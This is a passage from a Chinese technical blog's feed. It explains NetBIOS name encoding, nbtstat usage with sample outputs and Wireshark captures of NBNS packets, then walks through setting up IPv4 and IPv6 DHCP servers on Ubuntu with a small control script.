+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|MAX_TOTAL_NUMBER_COMMAND_BLOCKS|    NUMBER_PENDING_SESSIONS    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  MAX_NUMBER_PENDING_SESSIONS  |  MAX_TOTAL_SESSIONS_POSSIBLE  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   SESSION_DATA_PACKET_SIZE    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<h2 id="NetBIOS-命名编码"><a href="#NetBIOS-命名编码" class="headerlink" title="NetBIOS 命名编码"></a>NetBIOS 命名编码</h2><p>上面所有提及的报文中都包含NetBIOS名称，这个名称是被经过编码处理的。参考以下<a href="https://tools.ietf.org/html/rfc1001" target="_blank" rel="noopener">RFC 1001 Ch14.1</a>可知，最长16Byte的NetBIOS name被要求映射为32Byte的可逆的、半ASCII偏置编码。</p>
<blockquote>
<p>The 16 byte NetBIOS name is mapped into a 32 byte wide field using a reversible, half-ASCII, biased encoding.  Each half-octet of the NetBIOS name is encoded into one byte of the 32 byte field.  The first half octet is encoded into the first byte, the second half- octet into the second byte, etc.</p>
<p>Each 4-bit, half-octet of the NetBIOS name is treated as an 8-bit, right-adjusted, zero-filled binary number.  This number is added to value of the ASCII character &#39;A&#39; (hexidecimal 41).  The resulting 8- bit number is stored in the appropriate byte.</p>
</blockquote>
<p>简单讲，就是将每个字符按ASCII拆成两部分，每部分再加上<code>A</code>，从而由1个字符变成两个字符。比如字符<code>L</code>，对应ASCII <code>0x4C</code>，拆成两部分为<code>0x4</code>和<code>0xC</code>，然后每部分都加上字符<code>A</code>对应的ASCII <code>0x41</code>，得到<code>0x45</code>和<code>0x4D</code>，对应字符<code>E</code>和<code>M</code>，这样原始字符<code>L</code>就变成了双字符<code>EM</code>。下面是这个示例的详细说明图解。</p>
<p><img src="/assets/network/nbns/nbns_name.png" alt="NetBIOS命名编码示例"></p>
<p>注意原始名称不足16字节可以补空格<code>0x20</code>或NULL<code>0x00</code>，这里补的是空格；如果长度超过16则需要截取前16字节。</p>
<p>使用<code>Python</code>可以快速完成编码↓</p>
<pre><code class="python">&gt;&gt;&gt; orig_name = &#39;LITREILY&#39;.ljust(16)
&gt;&gt;&gt; encoded_name = &#39;&#39;.join([ chr((ord(c)&gt;&gt;4) + ord(&#39;A&#39;)) + chr((ord(c)&amp;0x0F) + ord(&#39;A&#39;)) for c in orig_name ])
&gt;&gt;&gt; encoded_name
&#39;EMEJFEFCEFEJEMFJCACACACACACACACA&#39;
</code></pre>
<p>在真实的数据包中，NetBIOS名称前面是<code>0x20</code>，代表名称固定长度32字节，名称后面填补一个<code>0x00</code>即<code>\0</code>作为结束符。那么上面的<code>LITREILY</code>对应的数据为：</p>
<pre><code class="yml">20 45 4d 45 4a 46 45 46 43 45 46 45 4a 45 4d 46
4a 43 41 43 41 43 41 43 41 43 41 43 41 43 41 43
41 00
</code></pre>
<blockquote>
<p><strong>注意：</strong></p>
<p>A label length count is actually a 6-bit field in the label length field. The most significant 2 bits of the field, bits 7 and 6, are flags allowing an escape from the above compressed representation. <strong>If bits 7 and 6 are both set (11), the following 14 bits are an offset pointer into the full message to the actual label string from another domain name that belongs in this name.</strong> This label pointer allows for a further compression of a domain name in a packet.</p>
<p>简单说，当长度设置不为<code>0x20</code>，而是将最高两位置1，即设为<code>0xc0</code>时，代表当前名称使用指针，随后的字节指定名称所在的位置。</p>
</blockquote>
<h2 id="nbtstat"><a href="#nbtstat" class="headerlink" title="nbtstat"></a>nbtstat</h2><p><code>nbtstat.exe</code>是Windows中用于查看NBT status的工具，通过它可以查看当前局域网内的NetBIOS name.</p>
<h3 id="帮助信息"><a href="#帮助信息" class="headerlink" title="帮助信息"></a>帮助信息</h3><pre><code class="yml">C:\Users\Litre&gt;nbtstat.exe -a
显示协议统计和当前使用 NBI 的 TCP/IP 连接
(在 TCP/IP 上的 NetBIOS)。

NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n]
        [-r] [-R] [-RR] [-s] [-S] [interval] ]

  -a   (适配器状态)    列出指定名称的远程机器的名称表
  -A   (适配器状态)    列出指定 IP 地址的远程机器的名称表。
  -c   (缓存)          列出远程[计算机]名称及其 IP 地址的 NBT 缓存
  -n   (名称)          列出本地 NetBIOS 名称。
  -r   (已解析)        列出通过广播和经由 WINS 解析的名称
  -R   (重新加载)      清除和重新加载远程缓存名称表
  -S   (会话)          列出具有目标 IP 地址的会话表
  -s   (会话)          列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。
  -RR  (释放刷新)      将名称释放包发送到 WINS，然后启动刷新

  RemoteName   远程主机计算机名。
  IP address   用点分隔的十进制表示的 IP 地址。
  interval     重新显示选定的统计、每次显示之间暂停的间隔秒数。
               按 Ctrl+C 停止重新显示统计。
</code></pre>
<p>其中<code>RemoteName</code>既可以是ASCII形式的名称，也可以是IP地址。</p>
<h3 id="使用示例一"><a href="#使用示例一" class="headerlink" title="使用示例一"></a>使用示例一</h3><p>第一个例子，在加入域<code>DELTA</code>的办公电脑上。3个网卡，第1个网卡连接路由器，第2个网卡连接公司网，第3个为虚拟网卡。</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat.exe -n

Router:
节点 IP 址址: [192.168.1.10] 范围 ID: []

                NetBIOS 本地名称表

       名称               类型         状态
    ---------------------------------------------
    CNSHDNI2PC074  &lt;00&gt;  唯一          已注册
    DELTA          &lt;00&gt;  组           已注册
    CNSHDNI2PC074  &lt;20&gt;  唯一          已注册
    DELTA          &lt;1E&gt;  组           已注册
    DELTA          &lt;1D&gt;  唯一          已注册
    ..__MSBROWSE__.&lt;01&gt;  组           已注册

Company:
节点 IP 址址: [172.17.144.33] 范围 ID: []

                NetBIOS 本地名称表

       名称               类型         状态
    ---------------------------------------------
    CNSHDNI2PC074  &lt;00&gt;  唯一          已注册
    DELTA          &lt;00&gt;  组           已注册
    CNSHDNI2PC074  &lt;20&gt;  唯一          已注册
    DELTA          &lt;1E&gt;  组           已注册

以太网:
节点 IP 址址: [0.0.0.0] 范围 ID: []

    缓存中没有名称
</code></pre>
<p>需要注意的是，名称表中每个名称都是16字节，中间空白处是空格符，最后一个字节用<code>&lt;&gt;</code>显示，里面使用16进制数表示。如<code>CHSH2DNIPC074__&lt;00&gt;</code>，<code>_</code>代表空格，最后一个字节<code>&lt;00&gt;</code>是<code>\0</code>. NetBIOS name可以唯一，也可以是多个设备共用一个组，唯一名称用于指定唯一一台设备，而组名如此处的<code>DELTA</code>是域名称，局域网加入域对应的域名就是这种组名称，也称之为<strong>工作组</strong>。</p>
<h3 id="使用示例二"><a href="#使用示例二" class="headerlink" title="使用示例二"></a>使用示例二</h3><p>第二个例子，我使用家用台式PC在局域网内进行了反复测试。下面是简要的抓包信息。</p>
<p><img src="/assets/network/nbns/nbns.png" alt="nbns packets"></p>
<p><code>nbtstat -a RemoteName</code>用于请求指定名称所在设备的名称表。</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -a DZ-DN-700

eth0:
节点 IP 址址: [192.168.1.14] 范围 ID: []

           NetBIOS 远程计算机名称表

       名称               类型         状态
    ---------------------------------------------
    DZ-DN-700      &lt;20&gt;  唯一          已注册
    DZ-DN-700      &lt;00&gt;  唯一          已注册
    DIAS           &lt;00&gt;  组           已注册
    DIAS           &lt;1E&gt;  组           已注册

    MAC 地址 = E4-42-A6-18-AB-00


C:\WINDOWS\system32&gt;nbtstat -a 192.168.1.12

eth0:
节点 IP 址址: [192.168.1.14] 范围 ID: []

           NetBIOS 远程计算机名称表

       名称               类型         状态
    ---------------------------------------------
    DZ-DN-700      &lt;20&gt;  唯一          已注册
    DZ-DN-700      &lt;00&gt;  唯一          已注册
    DIAS           &lt;00&gt;  组           已注册
    DIAS           &lt;1E&gt;  组           已注册

    MAC 地址 = E4-42-A6-18-AB-00
</code></pre>
<p><code>nbtstat -A IP_Address</code>用于请求指定IP所在设备的名称表。</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -A 192.168.1.12

eth0:
节点 IP 址址: [192.168.1.14] 范围 ID: []

           NetBIOS 远程计算机名称表

       名称               类型         状态
    ---------------------------------------------
    DZ-DN-700      &lt;20&gt;  唯一          已注册
    DZ-DN-700      &lt;00&gt;  唯一          已注册
    DIAS           &lt;00&gt;  组           已注册
    DIAS           &lt;1E&gt;  组           已注册
    DIAS           &lt;1D&gt;  唯一          已注册
    ..__MSBROWSE__.&lt;01&gt;  组           已注册

    MAC 地址 = E4-42-A6-18-AB-00
</code></pre>
<p><code>nbtstat -c</code>用于查看当前设备缓存中的名称表，注意每个名称都是可以被修改的，所以需要定时刷新，同时每个名称都有其寿命，寿命耗尽后需要重新请求。</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -c

eth0:
节点 IP 址址: [192.168.1.14] 范围 ID: []

                  NetBIOS 远程缓存名称表

        名称              类型       主机地址    寿命[秒]
    ------------------------------------------------------------
    DZ-DN-700      &lt;20&gt;  唯一              192.168.1.12        269
    DZ-DN-700      &lt;00&gt;  唯一              192.168.1.12        269
</code></pre>
<p><code>nbtstat -n</code>用于查看当前设备的本地名称表，与第一个例子一样。</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -n

eth0:
节点 IP 址址: [192.168.1.14] 范围 ID: []

                NetBIOS 本地名称表

       名称               类型         状态
    ---------------------------------------------
    DT-LITREILY    &lt;20&gt;  唯一          已注册
    DT-LITREILY    &lt;00&gt;  唯一          已注册
    WORKGROUP      &lt;00&gt;  组           已注册
</code></pre>
<p><code>nbtstat -r</code>用于查看通过广播和经由 WINS 解析的名称</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -r

    NetBIOS 名称解析和注册统计
    ----------------------------------------------------

    通过广播解析的     = 5
    通过名称服务器解析   = 0

    通过广播注册的   = 3
    通过名称服务器注册的 = 0

    通过广播解析的 NetBIOS 名称
    ---------------------------------------------
           DZ-DN-700      &lt;00&gt;
           DZ-DN-700      &lt;00&gt;
           DZ-DN-700      &lt;00&gt;
           DIAS           &lt;00&gt;
           DZ-DN-700      &lt;00&gt;
</code></pre>
<p><code>nbtstat -s</code>与<code>nbtstat -S</code>都用于会话服务信息查询，因为没有连接所以信息为空。</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -s

eth0:
节点 IP 址址: [192.168.1.14] 范围 ID: []

    无连接

C:\WINDOWS\system32&gt;nbtstat -S

eth0:
节点 IP 址址: [192.168.1.14] 范围 ID: []

    无连接
</code></pre>
<p><code>nbtstat -R</code>用于清除缓存，清除后再用<code>-c</code>查看就会显示没有名称了。</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -R
    NBT 远程缓存名称表的成功清除和预加载。

C:\WINDOWS\system32&gt;nbtstat -c

eth0:
节点 IP 址址: [192.168.1.14] 范围 ID: []

    缓存中没有名称
</code></pre>
<p><code>nbtstat -RR</code>用于刷新经本机注册的NetBIOS名称，间隔一段时间方能刷新第二次。</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -RR
    已经刷新经过此计算机注册的 NetBIOS 名称。
</code></pre>
<h2 id="Windows-配置NetBIOS"><a href="#Windows-配置NetBIOS" class="headerlink" title="Windows 配置NetBIOS"></a>Windows 配置NetBIOS</h2><p>在Windows操作系统中，可以打开某网卡的属性配置，然后选择IPv4配置的高级选项，<code>WINS</code>选项卡即可配置<code>NetBIOS</code>。默认情况是启用的，与下图所示一致。</p>
<p><img src="/assets/network/nbns/netbios_config.png" alt="Windows上的NetBIOS配置"></p>
<h2 id="wireshark-实例分析"><a href="#wireshark-实例分析" class="headerlink" title="wireshark 实例分析"></a>wireshark 实例分析</h2><p>最后来分析两个使用wireshark抓的NBNS数据包，以便更直观的理解和记忆。</p>
<h3 id="Node-Status"><a href="#Node-Status" class="headerlink" title="Node Status"></a>Node Status</h3><p>使用指令<code>nbtstat -A 192.168.1.12</code>向指定设备发送Node status query，使用wireshark抓包。</p>
<p><img src="/assets/network/nbns/nodestatus_ws.png" alt="nbns node status"></p>
<p>请求数据包如下：</p>
<p><img src="/assets/network/nbns/nodestatus_ws_query.png" alt="nbns node status query"></p>
<p>从wireshark得到的解析数据如下：</p>
<pre><code class="yml">0000   e4 42 a6 18 ab 00 00 e0 4c 5a 0a 78 08 00 45 00   äB¦.«..àLZ.x..E.
0010   00 4e 1e 82 00 00 80 11 98 b2 c0 a8 01 0e c0 a8   .N.......²À¨..À¨
0020   01 0c 00 89 00 89 00 3a 5a 12 e2 b1 00 00 00 01   .......:Z.â±....
0030   00 00 00 00 00 00 20 43 4b 41 41 41 41 41 41 41   ...... CKAAAAAAA
0040   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0050   41 41 41 41 41 41 41 00 00 21 00 01               AAAAAAA..!..

NetBIOS Name Service
    Transaction ID: 0xe2b1
    Flags: 0x0000, Opcode: Name query
        0... .... .... .... = Response: Message is a query
        .000 0... .... .... = Opcode: Name query (0)
        .... ..0. .... .... = Truncated: Message is not truncated
        .... ...0 .... .... = Recursion desired: Do not do query recursively
        .... .... ...0 .... = Broadcast: Not a broadcast packet
    Questions: 1
    Answer RRs: 0
    Authority RRs: 0
    Additional RRs: 0
    Queries
        *&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;: type NBSTAT, class IN
            Name: *&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt; (Workstation/Redirector)
            Type: NBSTAT (33)
            Class: IN (1)
</code></pre>
<p>该数据报包含一个请求，所以<code>Questions</code>为1，其余为0；请求包中的编码名称为<code>*</code>的编码后数据CKAAAAAAAAAAAAAAA...; 由于使用的是指定IP，所以是单播包；因为是NODE STATUS REQUEST, 所以QUESTION_TYPE是NBSTAT(0x0021).</p>
<p>从指定设备获取到的响应数据如下：</p>
<p><img src="/assets/network/nbns/nodestatus_ws_response.png" alt="nbns node status response"></p>
<p>从截图中已经可以清晰的看到数据格式及具体内容了，被折叠的名称信息中，<code>DZ-DN-700&lt;20&gt;</code>与<code>DIAS&lt;1e&gt;</code>如下：</p>
<pre><code class="yml">0000   00 e0 4c 5a 0a 78 e4 42 a6 18 ab 00 08 00 45 00   ..LZ.x........E.
0010   00 cb 53 50 00 00 80 11 63 67 c0 a8 01 0c c0 a8   ..SP....cg......
0020   01 0e 00 89 00 89 00 b7 01 c0                     .........

0020                                 e2 b1 84 00 00 00            .......
0030   00 01 00 00 00 00 20 43 4b 41 41 41 41 41 41 41   ...... CKAAAAAAA
0040   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0050   41 41 41 41 41 41 41 00 00 21 00 01 00 00 00 00   AAAAAAA..!......
0060   00 77 04                                          .w.

0060            44 5a 2d 44 4e 2d 37 30 30 20 20 20 20      DZ-DN-700    
0070   20 20 20 04 00                                       ..
Name: DZ-DN-700&lt;20&gt; (Server service)
Name flags: 0x0400, ONT: B-node, Name is active
    0... .... .... .... = Name type: Unique name
    .00. .... .... .... = ONT: B-node (0)
    ...0 .... .... .... = Name is being deregistered: No
    .... 0... .... .... = Name is in conflict: No
    .... .1.. .... .... = Name is active: Yes
    .... ..0. .... .... = Permanent node name: No

0070                  44 5a 2d 44 4e 2d 37 30 30 20 20        DZ-DN-700  
0080   20 20 20 20 00 04 00                                  ...
Name: DZ-DN-700&lt;00&gt; (Workstation/Redirector)
Name flags: 0x0400, ONT: B-node, Name is active
    0... .... .... .... = Name type: Unique name
    .00. .... .... .... = ONT: B-node (0)
    ...0 .... .... .... = Name is being deregistered: No
    .... 0... .... .... = Name is in conflict: No
    .... .1.. .... .... = Name is active: Yes
    .... ..0. .... .... = Permanent node name: No

0080                        44 49 41 53 20 20 20 20 20          DIAS     
0090   20 20 20 20 20 20 00 84 00                              ...
Name: DIAS&lt;00&gt; (Workstation/Redirector)
Name flags: 0x8400, Name type, ONT: B-node, Name is active
    1... .... .... .... = Name type: Group name
    .00. .... .... .... = ONT: B-node (0)
    ...0 .... .... .... = Name is being deregistered: No
    .... 0... .... .... = Name is in conflict: No
    .... .1.. .... .... = Name is active: Yes
    .... ..0. .... .... = Permanent node name: No

0090                              44 49 41 53 20 20 20            DIAS   
00a0   20 20 20 20 20 20 20 20 1e 84 00                          ...
Name: DIAS&lt;1e&gt; (Browser Election Service)
Name flags: 0x8400, Name type, ONT: B-node, Name is active
    1... .... .... .... = Name type: Group name
    .00. .... .... .... = ONT: B-node (0)
    ...0 .... .... .... = Name is being deregistered: No
    .... 0... .... .... = Name is in conflict: No
    .... .1.. .... .... = Name is active: Yes
    .... ..0. .... .... = Permanent node name: No

00a0                                    e4 42 a6 18 ab              .B...
00b0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
00c0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
00d0   00 00 00 00 00 00 00 00 00                        .........
</code></pre>
<h3 id="Name-Registration"><a href="#Name-Registration" class="headerlink" title="Name Registration"></a>Name Registration</h3><p><img src="/assets/network/nbns/registration_ws.png" alt="nbns registration"></p>
<p>NBNS名称注册请求包如下图所示：</p>
<p><img src="/assets/network/nbns/registration_ws_pkt.png" alt="nbns registration query"></p>
<p>请求包格式与<a href="#NAME-REGISTRATION-REQUEST">NAME REGISTRATION REQUEST</a>中的一致。使用广播包方式，<code>OPCODE</code>为5，包含一条Questions记录和Additional记录，注册地址为发送方的IP地址192.168.1.12.</p>
<p>在局域网内的其它设备或路由器接收到该广播包后，即可将其名称和IP地址记录到本地缓存当中。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><a href="https://tools.ietf.org/html/rfc1001" target="_blank" rel="noopener">rfc1001 - protocol standard for a nETbios service on a tcp/udp transport: concepts and methods</a></li>
<li><a href="https://tools.ietf.org/html/rfc1002" target="_blank" rel="noopener">rfc1002 - protocol standard for a nETbios service on a tcp/udp transport: detailed specifications</a></li>
<li><a href="https://github.com/Litreily/Net_packets/tree/master/NetBIOS" target="_blank" rel="noopener">wireshark抓包数据</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
            <category> Protocol </category>
            
        </categories>
        
        
        <tags>
            
            <tag> wireshark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Setup dhcpd/dhcpdv6 server]]></title>
      <url>https://www.litreily.top/2020/01/17/dhcpd_server/</url>
      <content type="html"><![CDATA[<p>搭建DHCP server在许多网络应用中是非常必要的，尤其是测试IPv6相关的功能时，本文就来介绍下针对IPv4和IPv6该如何搭建DHCP server.</p>
<h2 id="Install-dhcpd-server"><a href="#Install-dhcpd-server" class="headerlink" title="Install dhcpd server"></a>Install dhcpd server</h2><p>首先通过<code>apt</code>安装<code>isc-dhcp-server</code></p>
<pre><code class="bash">sudo apt install isc-dhcp-server
</code></pre>
<h2 id="Setup-dhcpd"><a href="#Setup-dhcpd" class="headerlink" title="Setup dhcpd"></a>Setup dhcpd</h2><h3 id="Config-interfaces"><a href="#Config-interfaces" class="headerlink" title="Config interfaces"></a>Config interfaces</h3><p>通过<code>ifconfig</code>获取以太网口的接口名称, 下面省略了loopback接口<code>lo</code>，后面也是一样默认省略。</p>
<pre><code class="bash">$ ifconfig
enp4s0f0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500
        ether 20:6a:8a:6c:0f:da  txqueuelen 1000 (Ethernet)
        RX packets 154583  bytes 186953698 (186.9 MB)
        RX errors 0  dropped 2  overruns 0  frame 0
        TX packets 77038  bytes 6244250 (6.2 MB)
        Tx erros 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19
</code></pre>
<p>编辑配置文件<code>/etc/default/isc-dhcp-server</code>，修改最后两行，设置为刚刚获取到的interface</p>
<pre><code class="bash">$ tail -n 2 /etc/default/isc-dhcp-server
INTERFACESv4=&quot;enp4s0f0&quot;
INTERFACESv6=&quot;enp4s0f0&quot;
</code></pre>
<h3 id="Config-dhcpd-server"><a href="#Config-dhcpd-server" class="headerlink" title="Config dhcpd server"></a>Config dhcpd server</h3><p>首先针对IPv4配置dhcpd server，配置文件为<code>/etc/dhcp/dhcpd.conf</code>, 配置内容包括网段，子网掩码，默认路由，默认DNS</p>
<pre><code class="bash">$ tail -n 5 /etc/dhcp/dhcpd.conf
subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.10 10.0.0.99;
    option routers 10.0.0.138;
    option domain-name-servers 10.0.0.138;
}
</code></pre>
<h3 id="Add-static-ipv4"><a href="#Add-static-ipv4" class="headerlink" title="Add static ipv4"></a>Add static ipv4</h3><p>此时只要再给网口设置一个静态IP就可以了</p>
<pre><code class="bash">sudo ifconfig enp4s0f0 10.0.0.138 netmask 255.255.255.0
</code></pre>
<h3 id="Start-isc-dhcp-server"><a href="#Start-isc-dhcp-server" class="headerlink" title="Start isc-dhcp-server"></a>Start isc-dhcp-server</h3><pre><code class="bash">sudo service isc-dhcp-server start
sudo service isc-dhcp-server status
</code></pre>
<p>通过第二条指令可以查看当前dhcpd的状态，显示<code>running</code>表示已经正常工作</p>
<pre><code class="bash">$ sudo service isc-dhcp-server status
● isc-dhcp-server.service - ISC DHCP IPv4 server
   Loaded: loaded (/lib/systemd/system/isc-dhcp-server.service; enabled; vendor preset: enabled)
   Active: active (running) since Sat 2020-01-18 04:22:28 CST; 7s ago
     Docs: man:dhcpd(8)
 Main PID: 13291 (dhcpd)
    Tasks: 1 (limit: 4915)
   CGroup: /system.slice/isc-dhcp-server.service
           └─13291 dhcpd -user dhcpd -group dhcpd -f -4 -pf /run/dhcp-server/dhcpd.pid -cf /etc/dhcp/dhcpd.conf

1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: PID file: /run/dhcp-server/dhcpd.pid
1月 18 04:22:28 litreily-Aspire-4750 sh[13291]: Wrote 1 leases to leases file.
1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Wrote 1 leases to leases file.
1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Listening on LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/24
1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Sending on   LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/24
1月 18 04:22:28 litreily-Aspire-4750 sh[13291]: Listening on LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/24
1月 18 04:22:28 litreily-Aspire-4750 sh[13291]: Sending on   LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/24
1月 18 04:22:28 litreily-Aspire-4750 sh[13291]: Sending on   Socket/fallback/fallback-net
1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Sending on   Socket/fallback/fallback-net
1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Server starting service.
</code></pre>
<h2 id="Setup-dhcpdv6"><a href="#Setup-dhcpdv6" class="headerlink" title="Setup dhcpdv6"></a>Setup dhcpdv6</h2><p>配置IPv6的dhcpd与IPv4类似，上面已经配置过<code>/etc/default/interfaces</code>，此处省略</p>
<h3 id="config-dhcpdv6-server"><a href="#config-dhcpdv6-server" class="headerlink" title="config dhcpdv6 server"></a>config dhcpdv6 server</h3><p>配置文件<code>/etc/dhcp/dhcpd6.conf</code></p>
<pre><code class="bash">$ tail -n 5 /etc/dhcp/dhcpd6.conf
subnet6 2001:470:19:1316::/64 {
    range6 2001:470:19:1316::100 2001:470:19:1316::0fff;
    option dhcp6.name-servers fe80::226a:8aff:fe6c:0fda;
    prefix6 2001:470:19:1316:2:: 2001:470:19:1316:0fff:: /80;
}
</code></pre>
<p>上面配置了IPv6的网段，分配范围，默认dns，以及IPv6前缀</p>
<h3 id="Add-static-IPv6"><a href="#Add-static-IPv6" class="headerlink" title="Add static IPv6"></a>Add static IPv6</h3><p>对于IPv6，需要添加两个ip，一个以<code>fe80::</code>开头的本地ip，另外一个静态global ip</p>
<pre><code class="bash">sudo ifconfig enp4s0f0 inet6 add 2001:470:19:1316::1/64
sudo ifconfig enp4s0f0 inet6 add fe80::226a:8aff:fe6c:fda/64
</code></pre>
<h3 id="Start-isc-dhcp-server6"><a href="#Start-isc-dhcp-server6" class="headerlink" title="Start isc-dhcp-server6"></a>Start isc-dhcp-server6</h3><p>dhcpdv6对应的server名称多了个6，启动方式自然也是一样的</p>
<pre><code class="bash">sudo service isc-dhcp-server6 start
sudo service isc-dhcp-server6 status
</code></pre>
<h2 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h2><p>在手动配置时，注意在启动服务之前，一定要记得配置好静态IP，否则无法启动server，并在查看状态时显示以下信息</p>
<pre><code class="bash">$ sudo service isc-dhcp-server status
● isc-dhcp-server.service - ISC DHCP IPv4 server
   Loaded: loaded (/lib/systemd/system/isc-dhcp-server.service; enabled; vendor preset: enabled)
   Active: failed (Result: exit-code) since Sat 2020-01-18 04:23:23 CST; 10s ago
     Docs: man:dhcpd(8)
  Process: 13864 ExecStart=/bin/sh -ec      CONFIG_FILE=/etc/dhcp/dhcpd.conf;      if [ -f /etc/ltsp/dhcpd.conf ]; then CONFIG_FILE=/etc/ltsp/dhcpd.conf; fi;      [ -e /var/lib/dhcp/dhcpd.leases ] || touch /var/lib/dhcp/dhcpd.leases;      chown root:dhcpd /var/lib/dhcp /var/lib/dhcp/dhcpd.leases;      chmod 775 /var/lib/dhcp ; chmod 664 /var/lib/dhcp/dhcpd.leases;      exec dhcpd -user dhcpd -group dhcpd -f -4 -pf /run/dhcp-server/dhcpd.pid -cf $CONFIG_FILE $INTERFACES (code=exited, status=1/FAILURE)
 Main PID: 13864 (code=exited, status=1/FAILURE)

1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]:
1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: If you think you have received this message due to a bug rather
1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: than a configuration issue please read the section on submitting
1月 18 04:23:23 litreily-Aspire-4750 systemd[1]: isc-dhcp-server.service: Main process exited, code=exited, status=1/FAILURE
1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: bugs on either our web page at www.isc.org or in the README file
1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: before submitting a bug.  These pages explain the proper
1月 18 04:23:23 litreily-Aspire-4750 systemd[1]: isc-dhcp-server.service: Failed with result &#39;exit-code&#39;.
1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: process and the information we find helpful for debugging..
1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]:
1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: exiting.
</code></pre>
<h2 id="Shell-script"><a href="#Shell-script" class="headerlink" title="Shell script"></a>Shell script</h2><p>为了方便配置server，我写了一个简单的执行脚本，network servers control, 简称<code>nsc</code></p>
<pre><code class="zsh">$ cat nsc
#!/bin/zsh
# network servers control

IFCONFIG=1
INTERFACE=enp4s0f0

IPv4=10.0.0.138
IPv6=2001:470:19:1316::1/64
IPv6_local=fe80::226a:8aff:fe6c:fda/64

stop_dhcp() {
    # stop services
    sudo service isc-dhcp-server stop
    sudo service isc-dhcp-server6 stop

    # del all default ip
    if [ $IFCONFIG -eq 1 ]; then
        sudo ifconfig $INTERFACE 0.0.0.0
        sudo ifconfig $INTERFACE del $IPv6
        sudo ifconfig $INTERFACE del $IPv6_local
    else
        sudo ip addr delete $IPv4/24 dev enp4s0f0
        sudo ip addr delete $IPv6 dev enp4s0f0
        sudo ip addr delete $IPv6_local dev enp4s0f0
    fi
}

start_dhcp() {
    # setup default ip
    if [ $IFCONFIG -eq 1 ]; then
        sudo ifconfig $INTERFACE $IPv4 netmask 255.255.255.0
        sudo ifconfig $INTERFACE inet6 add $IPv6
        sudo ifconfig $INTERFACE inet6 add $IPv6_local
    else
        sudo ip addr add $IPv4/24 dev enp4s0f0
        sudo ip addr add $IPv6 dev enp4s0f0
        sudo ip addr add $IPv6_local dev enp4s0f0
    fi

    # start services
    sudo service isc-dhcp-server start
    [ $? -eq 0 ] &amp;&amp; echo &quot;start dhcpd success!&quot;
    sudo service isc-dhcp-server6 start
    [ $? -eq 0 ] &amp;&amp; echo &quot;start dhcpdv6 success!&quot;
}

case &quot;$1&quot; in
    &quot;stop&quot;)
        stop_dhcp
        ;;
    &quot;start&quot;)
        start_dhcp
        ;;
esac
</code></pre>
<p>脚本中通过<code>$IFCONFIG</code>变量来选择使用<code>ifconfig</code>指令还是<code>ip</code>指令进行配置。使用时只需执行<code>nsc start</code>打开server, 执行<code>nsc stop</code>关闭server.</p>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> dhcp </tag>
            
            <tag> ipv6 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[根据socket端口号查看进程信息]]></title>
      <url>https://www.litreily.top/2020/01/15/socket_fd/</url>
